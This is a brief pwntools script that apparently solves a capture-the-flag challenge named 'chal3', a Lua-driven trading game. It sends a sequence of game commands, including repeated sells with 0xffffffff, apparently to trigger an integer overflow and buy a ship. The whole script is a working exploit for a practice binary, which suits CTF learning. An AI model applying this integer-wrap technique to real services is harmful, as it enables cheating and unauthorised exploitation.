from pwn import *

s = process("./chal3")

s.clean()
s.sendline("g = Game.new()")
s.sendline("g:jump(2)")
s.sendline("g:sell(1,1)")
s.sendline("g:buy(3,100)")
s.sendline("g:jump(1)")
s.sendline("g:sell(3,0xffffffff)")
s.sendline("g:sell(3,0xffffffff)")
s.sendline("g:sell(3,0xffffffff)")
s.sendline("g:buyShip(3)")
s.clean()
s.sendline("g:info()")

s.interactive()
